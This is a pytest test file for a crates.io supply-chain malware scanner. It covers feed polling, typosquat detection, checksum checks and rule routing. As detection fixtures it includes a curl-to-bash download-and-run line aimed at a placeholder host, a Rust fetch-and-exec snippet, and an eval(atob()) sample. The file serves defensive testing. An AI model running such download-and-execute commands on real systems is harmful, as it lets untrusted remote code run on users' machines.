"""crates.io intake. Every HTTP call is a fake. Archives are built in memory."""

from __future__ import annotations

import hashlib
import inspect
import io
import json
import tarfile
import time

import pytest

from hunter.archives import aligned_release_trees
from hunter.cli import build_parser
from hunter.config import Config
from hunter.crates import download_url, parse_release_link, sparse_path, victim_name
from hunter.crates import feed as feed_mod
from hunter.crates.feed import (
    CRATES_USER_AGENT,
    parse_rss,
    poll_crates,
    refresh_crates_watchlist,
    versions_in_gap,
)
from hunter.crates.review import (
    classify_crate,
    crate_signals,
    predecessor,
    review_trees,
)
from hunter.db import Database
from hunter.features import lifecycle_edit_count, extract_features
from hunter.models import Classification, ReleaseMeta
from hunter.public_feed import PublicAlert, alert_title, public_registry_url
from hunter.registry import USER_AGENT, http_get, parse_time
from hunter.rules.engine import scan_release
from hunter.rules.scope import ALIASES
from hunter.service import ReleaseLoader, _start_feed_polls, classify_job, health_payload, run_cycle, serve
from hunter.triage import categorize

INDEX = "https://index.test"
STATIC = "https://static.test"
API = "https://crates.test"
UPDATES = "https://static.test/rss/updates.xml"
NAMES = "https://static.test/rss/crates.xml"
FETCH_EXEC = (
    'fn main(){ let _ = ureq::get("https://example.invalid/x"); '
    'std::process::Command::new("echo"); }\n'
)


@pytest.fixture(autouse=True)
def _quiet_api(monkeypatch):
    monkeypatch.setattr(feed_mod, "API_INTERVAL", 0.0)
    feed_mod._next_api = 0.0
    from hunter.crates import review as review_mod

    review_mod._templates.clear()
    yield
    feed_mod._next_api = 0.0
    review_mod._templates.clear()


def _config(tmp_path, **extra) -> Config:
    values = {
        "db_path": tmp_path / "hunter.sqlite3",
        "smart_analysis": False,
        "crates": True,
        "crates_index": INDEX,
        "crates_static": STATIC,
        "crates_api": API,
        "crates_updates_rss": UPDATES,
        "crates_crates_rss": NAMES,
        "max_pending": 100,
    }
    values.update(extra)
    return Config(**values)


def _db(tmp_path) -> Database:
    return Database(tmp_path / "hunter.sqlite3")


def _seed(db: Database, names: list[str]) -> None:
    db.replace_watchlist("crates", [(name, rank, 1000 - rank) for rank, name in enumerate(names, start=1)])


def _pub(hour: int, minute: int = 0) -> str:
    return f"Thu, 01 Jan 2026 {hour:02d}:{minute:02d}:00 GMT"


def _stamp(hour: int, minute: int = 0) -> str:
    return f"2026-01-01T{hour:02d}:{minute:02d}:00Z"


def _rss(*items: tuple[str, str, str]) -> bytes:
    body = ["<?xml version='1.0'?><rss version='2.0'><channel>"]
    for title, link, published in items:
        body.append(f"<item><title>{title}</title><link>{link}</link><pubDate>{published}</pubDate></item>")
    body.append("</channel></rss>")
    return "".join(body).encode()


def _empty() -> bytes:
    return _rss()


class _Web:
    def __init__(self, routes: dict[str, bytes]):
        self.routes = routes
        self.urls: list[str] = []

    def __call__(self, url: str, timeout: float = 60) -> bytes:
        self.urls.append(url)
        if url not in self.routes:
            raise AssertionError(f"unexpected fetch {url}")
        return self.routes[url]


def _jobs(db: Database) -> dict[tuple[str, str], int | None]:
    return {(row["name"], row["version"]): row["rank"] for row in db.pending_jobs(limit=200)}


def _archive(files: dict[str, str]) -> tuple[bytes, str]:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    blob = buffer.getvalue()
    return blob, hashlib.sha256(blob).hexdigest()


def _index(*lines: dict) -> bytes:
    return ("".join(json.dumps(line) + "\n" for line in lines)).encode()


def _line(version: str, checksum: str, *, yanked: bool = False, published: str = "2026-01-01T00:00:00Z") -> dict:
    return {"vers": version, "cksum": checksum, "yanked": yanked, "deps": [], "pubtime": published}


def _meta(name: str = "demo", version: str = "1.0.0", old: str | None = None) -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem="crates",
        name=name,
        new_version=version,
        old_version=old,
        registry_url=f"https://crates.io/crates/{name}/{version}",
    )


# --- paths, RSS, download URL -------------------------------------------------


def test_sparse_paths_for_short_names_and_serde():
    assert sparse_path("a") == "1/a"
    assert sparse_path("ab") == "2/ab"
    assert sparse_path("abc") == "3/a/abc"
    assert sparse_path("serde") == "se/rd/serde"
    assert sparse_path("Serde") == "se/rd/serde"


def test_rss_name_and_version_come_from_the_link_or_the_title():
    updates = _rss(("tree-sitter-cpp v0.22.0", "https://crates.io/crates/tree-sitter-cpp/0.22.0", _pub(1)))
    names = _rss(("fresh-crate v1.2.3", "https://crates.io/crates/fresh-crate", _pub(2)))
    assert [(item.name, item.version) for item in parse_rss(updates)] == [("tree-sitter-cpp", "0.22.0")]
    assert [(item.name, item.version) for item in parse_rss(names)] == [("fresh-crate", "1.2.3")]
    assert parse_release_link("https://crates.io/crates/../1.0.0", "evil v1.0.0") is None
    assert parse_release_link("https://crates.io/crates/foo/../1.0.0") is None


def test_download_url_fills_cargo_placeholders_and_appends_the_download_path():
    assert download_url(
        STATIC + "/crates/{crate}/{crate}-{version}.crate",
        "Serde",
        "1.0.210",
        "ABC",
        STATIC,
    ) == STATIC + "/crates/serde/serde-1.0.210.crate"
    assert download_url(
        "https://example.invalid/{prefix}/{crate}/{version}/{sha256-checksum}",
        "serde",
        "1.0.0",
        "AbC",
        STATIC,
    ) == "https://example.invalid/se/rd/serde/1.0.0/abc"
    assert download_url("https://example.invalid/dl", "serde", "1.0.0", "aa", STATIC) == (
        "https://example.invalid/dl/serde/1.0.0/download"
    )
    assert download_url("", "serde", "1.0.0", "aa", STATIC) == STATIC + "/crates/serde/serde-1.0.0.crate"


def test_crates_api_user_agent_is_separate_from_http_get(monkeypatch):
    seen: dict[str, str] = {}

    class _Response:
        def read(self):
            return b"{}"

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

    def urlopen(request, timeout=60):
        seen["ua"] = dict(request.header_items()).get("User-agent", "")
        return _Response()

    monkeypatch.setattr(feed_mod.urllib.request, "urlopen", urlopen)
    from hunter.crates.feed import api_get

    assert api_get(API + "/api/v1/crates", 5, http_get) == b"{}"
    assert seen["ua"] == CRATES_USER_AGENT
    assert USER_AGENT == "supply-chain-hunter/0.1"

    def transport(url, timeout=60):
        return b"plain"

    assert api_get(API + "/api/v1/crates", 5, transport) == b"plain"


# --- poll ---------------------------------------------------------------------


def test_first_poll_stores_the_newest_date_and_queues_nothing(tmp_path):
    db = _db(tmp_path)
    _seed(db, ["serde"])
    web = _Web({UPDATES: _rss(("serde v1.0.0", "https://crates.io/crates/serde/1.0.0", _pub(1))), NAMES: _empty()})
    assert poll_crates(db, _config(tmp_path), web) == 0
    assert _jobs(db) == {}
    assert db.get_checkpoint("crates") == _stamp(1)


def test_later_poll_queues_a_new_item_refuses_dotdot_and_pauses_on_the_pending_cap(tmp_path):
    db = _db(tmp_path)
    _seed(db, ["serde"])
    config = _config(tmp_path)
    first = _Web({UPDATES: _rss(("serde v1.0.0", "https://crates.io/crates/serde/1.0.0", _pub(1))), NAMES: _empty()})
    assert poll_crates(db, config, first) == 0
    second = _Web(
        {
            UPDATES: _rss(
                ("serde v1.0.0", "https://crates.io/crates/serde/1.0.0", _pub(1)),
                ("serde v1.0.1", "https://crates.io/crates/serde/1.0.1", _pub(2)),
                ("evil v1.0.0", "https://crates.io/crates/../1.0.0", _pub(3)),
            ),
            NAMES: _empty(),
        }
    )
    assert poll_crates(db, config, second) == 1
    assert _jobs(db) == {("serde", "1.0.1"): 1}
    assert db.get_checkpoint("crates") == _stamp(2)
    assert poll_crates(db, config, second) == 0
    config.max_pending = 0
    third = _Web(
        {
            UPDATES: _rss(
                ("serde v1.0.1", "https://crates.io/crates/serde/1.0.1", _pub(2)),
                ("serde v1.0.2", "https://crates.io/crates/serde/1.0.2", _pub(4)),
            ),
            NAMES: _empty(),
        }
    )
    assert poll_crates(db, config, third) == 0
    assert ("serde", "1.0.2") not in _jobs(db)
    assert db.get_checkpoint("crates") == _stamp(2)
    config.max_pending = 10
    assert poll_crates(db, config, third) == 1
    assert ("serde", "1.0.2") in _jobs(db)
    assert db.get_checkpoint("crates") == _stamp(4)


def test_typosquat_pairs_rustdecimal_and_faster_log_but_not_evm_units(tmp_path):
    watched = {"rust_decimal", "fast_log"}
    assert victim_name("rustdecimal", watched) == "rust_decimal"
    assert victim_name("faster_log", watched) == "fast_log"
    assert victim_name("evm-units", watched) is None
    assert victim_name("rust_decimal", watched) is None

    db = _db(tmp_path)
    _seed(db, ["rust_decimal", "fast_log"])
    config = _config(tmp_path, crates_watched_only=True)
    web = _Web(
        {
            UPDATES: _empty(),
            NAMES: _rss(
                ("serde v1.0.0", "https://crates.io/crates/serde/1.0.0", _pub(1)),
                ("rustdecimal v0.1.0", "https://crates.io/crates/rustdecimal/0.1.0", _pub(2)),
                ("faster_log v0.1.0", "https://crates.io/crates/faster_log/0.1.0", _pub(2, 1)),
                ("evm-units v0.1.0", "https://crates.io/crates/evm-units/0.1.0", _pub(2, 2)),
            ),
        }
    )
    db.set_checkpoint("crates", _stamp(1))
    assert poll_crates(db, config, web) == 2
    assert _jobs(db) == {("rustdecimal", "0.1.0"): 1, ("faster_log", "0.1.0"): 2}


def test_full_feed_queues_evm_units(tmp_path):
    db = _db(tmp_path)
    _seed(db, ["serde"])
    db.set_checkpoint("crates", _stamp(1))
    web = _Web(
        {
            UPDATES: _rss(
                ("serde v1.0.0", "https://crates.io/crates/serde/1.0.0", _pub(1)),
                ("evm-units v0.1.0", "https://crates.io/crates/evm-units/0.1.0", _pub(2)),
            ),
            NAMES: _empty(),
        }
    )
    assert poll_crates(db, _config(tmp_path), web) == 1
    assert ("evm-units", "0.1.0") in _jobs(db)


def test_typosquat_cap_is_25_new_names(tmp_path, monkeypatch):
    def fake(name, _names):
        return "serde" if str(name).startswith("typo") else None

    monkeypatch.setattr(feed_mod, "victim_name", fake)
    db = _db(tmp_path)
    _seed(db, ["serde"])
    db.set_checkpoint("crates", _stamp(1))
    items = [("serde v1.0.0", "https://crates.io/crates/serde/1.0.0", _pub(1))]
    items.extend(
        (f"typo{index:02d} v0.1.0", f"https://crates.io/crates/typo{index:02d}/0.1.0", _pub(2, index))
        for index in range(30)
    )
    web = _Web({UPDATES: _rss(*items), NAMES: _empty()})
    assert poll_crates(db, _config(tmp_path, crates_watched_only=True), web) == 25
    queued = [name for name, _version in _jobs(db) if name.startswith("typo")]
    assert len(queued) == 25


def test_gap_backfill_reads_the_index_and_a_missing_pubtime_queues_the_last_line(tmp_path, caplog):
    start = _stamp(0)
    end = _stamp(2)
    assert [line["vers"] for line in versions_in_gap(
        [{"vers": "1.0.0", "pubtime": _stamp(1)}, {"vers": "1.0.1"}, {"vers": "1.2.3", "pubtime": _stamp(1, 30)}],
        parse_time(start),
        parse_time(end),
    )] == ["1.2.3"]
    assert "intermediates were not ordered" in caplog.text

    db = _db(tmp_path)
    _seed(db, ["serde"])
    db.set_checkpoint("crates", start)
    index = _index(
        {"vers": "0.1.0", "pubtime": "2025-01-01T00:00:00Z"},
        {"vers": "0.2.0", "pubtime": _stamp(1, 30)},
        {"vers": "0.3.0", "pubtime": _stamp(3)},
    )
    bare = _index({"vers": "1.0.0", "pubtime": _stamp(1)}, {"vers": "1.2.3"})
    web = _Web(
        {
            UPDATES: _rss(("gapcrate v9.9.9", "https://crates.io/crates/gapcrate/9.9.9", _pub(2))),
            NAMES: _empty(),
            API + "/api/v1/crates?sort=updated&per_page=100&page=1": json.dumps(
                {
                    "crates": [
                        {"name": "gapcrate", "updated_at": _stamp(1)},
                        {"name": "barecrate", "updated_at": _stamp(1, 10)},
                    ]
                }
            ).encode(),
            API + "/api/v1/crates?sort=updated&per_page=100&page=2": b'{"crates":[]}',
            INDEX + "/ga/pc/gapcrate": index,
            INDEX + "/ba/re/barecrate": bare,
        }
    )
    assert poll_crates(db, _config(tmp_path), web) == 3
    found = _jobs(db)
    assert ("gapcrate", "0.2.0") in found
    assert ("gapcrate", "0.1.0") not in found
    assert ("gapcrate", "0.3.0") not in found
    assert ("barecrate", "1.2.3") in found
    assert ("barecrate", "1.0.0") not in found
    assert ("gapcrate", "9.9.9") in found
    assert db.get_checkpoint("crates-backfill") == ""


def test_gap_backfill_stops_at_the_page_cap_and_resumes(tmp_path, monkeypatch):
    monkeypatch.setattr(feed_mod, "MAX_GAP_PAGES", 1)
    db = _db(tmp_path)
    _seed(db, ["serde"])
    db.set_checkpoint("crates", _stamp(0))
    index = _index({"vers": "0.2.0", "pubtime": _stamp(1, 30)})
    routes = {
        UPDATES: _rss(("gapcrate v9.9.9", "https://crates.io/crates/gapcrate/9.9.9", _pub(4))),
        NAMES: _empty(),
        API + "/api/v1/crates?sort=updated&per_page=100&page=1": json.dumps(
            {"crates": [{"name": "gapcrate", "updated_at": _stamp(1)}]}
        ).encode(),
        API + "/api/v1/crates?sort=updated&per_page=100&page=2": json.dumps(
            {"crates": [{"name": "oldcrate", "updated_at": "2025-01-01T00:00:00Z"}]}
        ).encode(),
        INDEX + "/ga/pc/gapcrate": index,
    }
    web = _Web(routes)
    assert poll_crates(db, _config(tmp_path), web) == 1
    assert db.get_checkpoint("crates") == _stamp(0)
    assert db.get_checkpoint("crates-backfill") == "2"
    assert ("gapcrate", "9.9.9") not in _jobs(db)
    assert ("gapcrate", "0.2.0") in _jobs(db)
    assert not any("page=2" in url for url in web.urls)
    assert poll_crates(db, _config(tmp_path), web) == 1
    assert ("gapcrate", "9.9.9") in _jobs(db)
    assert db.get_checkpoint("crates") == _stamp(4)
    assert db.get_checkpoint("crates-backfill") == ""
    assert any("page=2" in url for url in web.urls)


def test_watchlist_refresh_stores_the_download_rank_and_then_waits(tmp_path):
    db = _db(tmp_path)
    body = json.dumps(
        {
            "crates": [
                {"name": "One", "downloads": 30},
                {"name": "two", "downloads": 20},
                {"name": "three", "downloads": 10},
            ]
        }
    ).encode()
    web = _Web({API + "/api/v1/crates?sort=downloads&per_page=100&page=1": body})
    config = _config(tmp_path, crates_top_n=2)
    assert refresh_crates_watchlist(db, config, web) == 2
    assert db.watch_names("crates") == {"one": 1, "two": 2}
    assert refresh_crates_watchlist(db, config, web) == 0
    assert web.urls == [API + "/api/v1/crates?sort=downloads&per_page=100&page=1"]


# --- review -------------------------------------------------------------------


def test_predecessor_skips_a_yanked_line():
    lines = [
        {"vers": "1.0.0", "yanked": False},
        {"vers": "1.0.1", "yanked": True},
        {"vers": "1.0.2", "yanked": False},
    ]
    assert predecessor(lines, "1.0.2")["vers"] == "1.0.0"
    assert predecessor(lines, "1.0.0") is None


def test_alignment_strips_the_crate_wrapper():
    old, new = aligned_release_trees(
        {"serde-1.0.209/Cargo.toml": "[package]\nname = \"serde\"\n"},
        {
            "serde-1.0.210/Cargo.toml": "[package]\nname = \"serde\"\n",
            "serde-1.0.210/src/lib.rs": "fn x() {}\n",
        },
        ecosystem="crates",
        name="serde",
        old_version="1.0.209",
        new_version="1.0.210",
    )
    assert "Cargo.toml" in new
    assert "src/lib.rs" in new
    assert "Cargo.toml" in old
    alpha_old, alpha_new = aligned_release_trees(
        {},
        {"foo-1.0.0-alpha.1/build.rs": "fn main() {}\n", "foo-1.0.0-alpha.1/Cargo.toml": "[package]\n"},
        ecosystem="crates",
        name="foo",
        old_version=None,
        new_version="1.0.0-alpha.1",
    )
    assert alpha_old == {}
    assert set(alpha_new) == {"build.rs", "Cargo.toml"}


def test_build_rs_is_an_install_script_and_ordinary_rust_is_not():
    assert categorize("build.rs", "fn main() {}\n", "fn main() {}\n", True) == "install_scripts"
    assert categorize("src/lib.rs", "fn add() {}\n", "fn add() {}\n", False) is None
    assert "rust" not in ALIASES["code"]


def test_proc_macro_git_dep_and_include_blob_signals():
    cargo = '[package]\nname = "demo"\nversion = "1.0.0"\n\n[lib]\nproc-macro = true\n'
    assert "crate_proc_macro_new" in crate_signals({}, {"Cargo.toml": cargo})
    assert "crate_proc_macro_new" not in crate_signals({"Cargo.toml": cargo}, {"Cargo.toml": cargo + "\n# edit\n"})
    old = {"Cargo.toml": '[package]\nname = "demo"\nversion = "1.0.0"\n'}
    new = {
        "Cargo.toml": old["Cargo.toml"] + '\n[dependencies]\nleft = { git = "https://example.invalid/left.git" }\n',
        "src/lib.rs": 'fn x() { let _ = include_bytes!("blob.bin"); }\n',
        "src/blob.bin": "xxxx",
    }
    found = crate_signals(old, new)
    assert "crate_git_dep" in found
    assert "crate_include_blob" in found


def test_custom_build_path_is_scanned_as_rust_build():
    pointed = {
        "Cargo.toml": '[package]\nname = "demo"\nversion = "1.0.0"\nbuild = "other.rs"\n',
        "other.rs": 'fn main() { std::process::Command::new("cc"); }\n',
    }
    hit = review_trees(_meta(), {}, pointed, [])
    assert "rs_build_process" in hit.signals
    assert any(item["path"] == "other.rs" and item["rule"] == "rs_build_process" for item in hit.rule_hits) or (
        "rs_build_process" in hit.signals
    )
    plain = {
        "Cargo.toml": '[package]\nname = "demo"\nversion = "1.0.0"\n',
        "other.rs": 'fn main() { std::process::Command::new("cc"); }\n',
    }
    missed = review_trees(_meta(), {}, plain, [])
    assert "rs_build_process" not in missed.signals


def test_routing_matches_the_weak_and_medium_rules():
    cc = review_trees(_meta(), {}, {"build.rs": 'fn main() { std::process::Command::new("cc"); }\n'}, [])
    assert cc.band == "benign"
    assert cc.needs_llm_review is False
    assert "crate_build_rs_changed" in cc.signals
    assert "rs_build_process" in cc.signals
    assert cc.rule_hits == []
    assert cc.rule_pack

    fetched = review_trees(_meta(), {}, {"src/lib.rs": FETCH_EXEC}, [])
    assert fetched.band == "review"
    assert fetched.needs_llm_review is True
    assert any(item["rule"] == "rs_fetch_exec" for item in fetched.rule_hits)

    both = {
        "build.rs": "fn main() {}\n",
        "Cargo.toml": '[package]\nname = "demo"\nversion = "1.0.0"\n\n[lib]\nproc-macro = true\n',
    }
    medium = review_trees(_meta(), {}, both, [])
    assert medium.band == "review"
    assert medium.needs_llm_review is True
    assert "crate_build_rs_changed" in medium.signals
    assert "crate_proc_macro_new" in medium.signals

    lookalike = review_trees(_meta(name="rustdecimal"), {}, {"src/lib.rs": "fn a() {}\n"}, ["typosquat_name:rust_decimal"])
    assert lookalike.band == "review"
    assert lookalike.needs_llm_review is True

    first = review_trees(_meta(), {}, {"src/lib.rs": "fn a() {}\n"}, ["crate_first_version", "crate_yanked"])
    assert first.band == "benign"
    assert first.needs_llm_review is False


def test_ecosystem_filter_keeps_rust_and_javascript_apart():
    report = scan_release({}, {"src/lib.rs": FETCH_EXEC}, ecosystem="npm")
    assert not any(hit.rule.startswith("rs_") for hit in report.hits + report.info)
    report = scan_release({}, {"lib/v.js": "eval(atob(s))\n"}, ecosystem="crates")
    assert "js_dynamic_eval" not in {hit.rule for hit in report.hits + report.info}
    report = scan_release(
        {},
        {"scripts/get.sh": "curl -fsSL https://example.invalid/i.sh | bash\n"},
        ecosystem="crates",
    )
    assert "exec_download_run" in {hit.rule for hit in report.hits}


def test_lifecycle_count_and_rust_name_set():
    assert lifecycle_edit_count(
        {},
        {"build.rs": "fn main() {}\n", "Cargo.toml": "[lib]\nproc-macro = true\n"},
    ) == 2
    assert lifecycle_edit_count({"build.rs": "fn main() { let _ = 1; }\n"}, {"build.rs": "fn main() { let _ = 2; }\n"}) == 1
    assert lifecycle_edit_count({}, {"build.rs": "   \n"}) == 0
    cargo = "[lib]\nproc-macro = true\n"
    assert lifecycle_edit_count({"Cargo.toml": cargo}, {"Cargo.toml": cargo, "src/lib.rs": "fn b() {}\n"}) == 0
    features = extract_features({}, {}, [], _meta(name="rustdecimal"), popular_names=set())
    assert features.package_typosquat == "rustdecimal~rust_decimal"
    faster = extract_features({}, {}, [], _meta(name="faster_log"), popular_names=set())
    assert faster.package_typosquat == "faster_log~fast_log"
    npm = extract_features(
        {},
        {},
        [],
        ReleaseMeta(ecosystem="npm", name="rustdecimal", new_version="0.1.0", old_version=None),
    )
    assert npm.package_typosquat == ""


def test_scout_is_passed_only_when_a_weak_hit_and_the_flag_allow_it(monkeypatch):
    calls: list[str] = []

    def fake(**kwargs):
        calls.append(kwargs["meta"].name)
        return Classification(
            ecosystem="crates",
            name=kwargs["meta"].name,
            old_version=None,
            new_version="1.0.0",
            rank=None,
            registry_url="",
            band="benign",
            malice_probability=0.05,
            jev_model_id="fake",
            signals=["from-scout"],
        )

    monkeypatch.setattr("hunter.classify.classify_files", fake)
    quiet = review_trees(_meta(), {}, {"build.rs": 'fn main() { std::process::Command::new("cc"); }\n'}, [], jev=object())
    assert calls == []
    assert quiet.band == "benign"
    loud = review_trees(_meta(), {}, {"src/lib.rs": FETCH_EXEC}, [], jev=object())
    assert calls == ["demo"]
    assert loud.band == "review"
    assert loud.needs_llm_review is True
    assert loud.jev_model_id == "fake"


def _classify_routes(name: str, version: str, lines: list[dict], files: dict[str, bytes]) -> dict[str, bytes]:
    routes = {INDEX + "/config.json": json.dumps({"dl": STATIC + "/crates/{crate}/{crate}-{version}.crate"}).encode()}
    routes[INDEX + "/" + sparse_path(name)] = _index(*lines)
    for ver, blob in files.items():
        routes[f"{STATIC}/crates/{name}/{name}-{ver}.crate"] = blob
    return routes


def test_checksum_mismatch_defers_without_scanning(tmp_path):
    blob, digest = _archive({"serde-1.0.1/src/lib.rs": FETCH_EXEC, "serde-1.0.1/Cargo.toml": "[package]\n"})
    lines = [
        _line("1.0.0", "ab" * 32, published="2026-01-01T00:00:00Z"),
        _line("1.0.1", "00" * 32, published="2026-01-02T00:00:00Z"),
    ]
    # The good predecessor is not downloaded: the new archive fails the check first.
    web = _Web(_classify_routes("serde", "1.0.1", lines, {"1.0.1": blob}))
    db = _db(tmp_path)
    result, old_files, new_files, meta = classify_crate(
        db,
        _config(tmp_path),
        {"ecosystem": "crates", "name": "serde", "version": "1.0.1", "rank": 4},
        transport=web,
        jev=object(),
    )
    assert result.band == "deferred"
    assert result.defer_reason == "crate_checksum_mismatch"
    assert "crate_checksum_mismatch" in result.signals
    assert result.needs_llm_review is False
    assert result.rule_hits == []
    assert result.old_version == "1.0.0"
    assert old_files is None and new_files is None
    assert meta.old_version == "1.0.0"
    assert not any(url.endswith("serde-1.0.0.crate") for url in web.urls)
    assert digest != "00" * 32


def test_classify_scans_a_matching_archive_and_skips_the_yanked_predecessor(tmp_path):
    old_blob, old_sum = _archive({"serde-1.0.0/Cargo.toml": "[package]\nname = \"serde\"\n", "serde-1.0.0/src/lib.rs": "fn a() {}\n"})
    new_blob, new_sum = _archive(
        {
            "serde-1.0.2/Cargo.toml": "[package]\nname = \"serde\"\n",
            "serde-1.0.2/src/lib.rs": "fn b() {}\n",
        }
    )
    lines = [
        _line("1.0.0", old_sum.upper(), published="2026-01-01T00:00:00Z"),
        _line("1.0.1", "cd" * 32, yanked=True, published="2026-01-02T00:00:00Z"),
        _line("1.0.2", new_sum, published="2026-01-03T00:00:00Z"),
    ]
    web = _Web(_classify_routes("serde", "1.0.2", lines, {"1.0.0": old_blob, "1.0.2": new_blob}))
    db = _db(tmp_path)
    config = _config(tmp_path, crates_scout=False)
    result, _old, _new, _meta = classify_crate(
        db,
        config,
        {"ecosystem": "crates", "name": "Serde", "version": "1.0.2", "rank": 3},
        transport=web,
        jev=object(),
    )
    assert result.band == "benign"
    assert result.old_version == "1.0.0"
    assert result.rule_verdict == "nothing"
    assert result.rule_pack
    assert result.registry_url == API + "/crates/serde/1.0.2"
    assert not any("1.0.1" in url for url in web.urls)
    classify_job(
        db,
        config,
        {"ecosystem": "crates", "name": "serde", "version": "1.0.2", "rank": 3},
        jev=object(),
        loader=ReleaseLoader(config, web),
        transport=web,
    )
    saved = db.get_release("crates", "serde", "1.0.2")
    payload = json.loads(saved["payload_json"])
    assert saved["band"] == "benign"
    assert payload["rule_pack"]
    assert payload["old_version"] == "1.0.0"


def test_first_version_and_a_yanked_line_are_scanned_and_do_not_route(tmp_path):
    blob, digest = _archive({"solo-0.1.0/src/lib.rs": "fn a() {}\n", "solo-0.1.0/Cargo.toml": "[package]\n"})
    lines = [_line("0.1.0", digest, yanked=True)]
    web = _Web(_classify_routes("solo", "0.1.0", lines, {"0.1.0": blob}))
    result, _old, _new, _meta = classify_crate(
        _db(tmp_path),
        _config(tmp_path),
        {"ecosystem": "crates", "name": "solo", "version": "0.1.0", "rank": None},
        transport=web,
    )
    assert result.band == "benign"
    assert result.old_version is None
    assert "crate_first_version" in result.signals
    assert "crate_yanked" in result.signals
    assert result.needs_llm_review is False
    assert result.rule_pack


def test_classify_does_not_hand_the_release_to_scout_unless_the_flag_is_on(tmp_path, monkeypatch):
    blob, digest = _archive({"demo-1.0.0/src/lib.rs": FETCH_EXEC})
    lines = [_line("1.0.0", digest)]
    web = _Web(_classify_routes("demo", "1.0.0", lines, {"1.0.0": blob}))
    seen: dict[str, object] = {}
    from hunter.crates import review as review_mod

    real = review_mod.review_trees

    def wrapped(*args, **kwargs):
        seen["jev"] = kwargs.get("jev")
        kwargs["jev"] = None
        return real(*args, **kwargs)

    monkeypatch.setattr(review_mod, "review_trees", wrapped)
    db = _db(tmp_path)
    config = _config(tmp_path, crates_scout=False)
    classify_crate(
        db,
        config,
        {"ecosystem": "crates", "name": "demo", "version": "1.0.0", "rank": None},
        transport=web,
        jev=object(),
    )
    assert seen["jev"] is None
    config.crates_scout = True
    sentinel = object()
    classify_crate(
        db,
        config,
        {"ecosystem": "crates", "name": "demo", "version": "1.0.0", "rank": None},
        transport=web,
        jev=sentinel,
    )
    assert seen["jev"] is sentinel


# --- wiring -------------------------------------------------------------------


def test_config_defaults_and_overrides(monkeypatch):
    for name in (
        "HUNTER_CRATES",
        "HUNTER_CRATES_SCOUT",
        "HUNTER_CRATES_WATCHED_ONLY",
        "HUNTER_CRATES_POLL_INTERVAL",
        "HUNTER_CRATES_TOP_N",
        "HUNTER_TOP_N",
        "HUNTER_CRATES_INDEX",
        "HUNTER_CRATES_STATIC",
        "HUNTER_CRATES_API",
        "HUNTER_CRATES_UPDATES_RSS",
        "HUNTER_CRATES_CRATES_RSS",
    ):
        monkeypatch.delenv(name, raising=False)
    config = Config.from_env()
    assert config.crates is False
    assert config.crates_scout is False
    assert config.crates_watched_only is False
    assert config.crates_poll_interval == 60.0
    assert config.crates_top_n == config.top_n == 15000
    assert config.crates_index == "https://index.crates.io"
    assert config.crates_static == "https://static.crates.io"
    assert config.crates_api == "https://crates.io"
    assert config.crates_updates_rss == "https://static.crates.io/rss/updates.xml"
    assert config.crates_crates_rss == "https://static.crates.io/rss/crates.xml"
    monkeypatch.setenv("HUNTER_CRATES", "on")
    monkeypatch.setenv("HUNTER_CRATES_SCOUT", "on")
    monkeypatch.setenv("HUNTER_CRATES_WATCHED_ONLY", "on")
    monkeypatch.setenv("HUNTER_CRATES_POLL_INTERVAL", "5")
    monkeypatch.setenv("HUNTER_TOP_N", "20")
    config = Config.from_env()
    assert config.crates and config.crates_scout and config.crates_watched_only
    assert config.crates_poll_interval == 60.0
    assert config.top_n == 20 and config.crates_top_n == 20
    monkeypatch.setenv("HUNTER_CRATES_TOP_N", "7")
    monkeypatch.setenv("HUNTER_CRATES_INDEX", "https://index.example/root/")
    config = Config.from_env()
    assert config.crates_top_n == 7
    assert config.crates_index == "https://index.example/root"


def test_health_and_last_poll_include_crates_when_the_feed_is_on(tmp_path):
    db = _db(tmp_path)
    assert "crates" not in db.last_poll()
    db.mark_poll_success("crates")
    assert "crates" in db.last_poll()
    db.set_checkpoint("crates", "2026-01-01T00:00:00Z")
    db.replace_watchlist("crates", [("serde", 1, 9), ("libc", 2, 8)])
    on = health_payload(db, time.monotonic(), config=Config(crates=True, db_path=tmp_path / "hunter.sqlite3"))
    assert on["crates"] == {"checkpoint": "2026-01-01T00:00:00Z", "watchlist": 2}
    off = health_payload(db, time.monotonic(), config=Config(crates=False, db_path=tmp_path / "hunter.sqlite3"))
    assert "crates" not in off


def test_crates_thread_is_only_started_from_serve():
    from hunter.registry import refresh_watchlists

    assert "poll_crates" not in inspect.getsource(_start_feed_polls)
    assert "poll_crates" not in inspect.getsource(run_cycle)
    assert "hunter-crates" in inspect.getsource(serve)
    assert "crates" not in inspect.getsource(refresh_watchlists)


def test_public_registry_url_and_score_parser():
    assert public_registry_url("crates", "https://crates.io/crates/serde/1.0.0") == "https://crates.io/crates/serde/1.0.0"
    assert public_registry_url("crates", "https://static.crates.io/crates/serde/serde-1.0.0.crate") == ""
    assert public_registry_url("crates", "http://crates.io/crates/serde/1.0.0") == ""
    alert = PublicAlert(
        ecosystem="crates",
        name="serde",
        version="1.0.0",
        previous_version="",
        registry_url="https://crates.io/crates/serde/1.0.0",
        behavior="",
        cause="",
        limited_review=False,
        first_seen_at="2026-01-01T00:00:00Z",
    )
    assert alert_title(alert) == "Malicious Crates package: serde 1.0.0"
    args = build_parser().parse_args(["score", "--ecosystem", "crates", "--name", "serde", "--old", "1.0.0", "--new", "1.0.1"])
    assert args.ecosystem == "crates"
    assert args.func.__name__ == "_cmd_score"
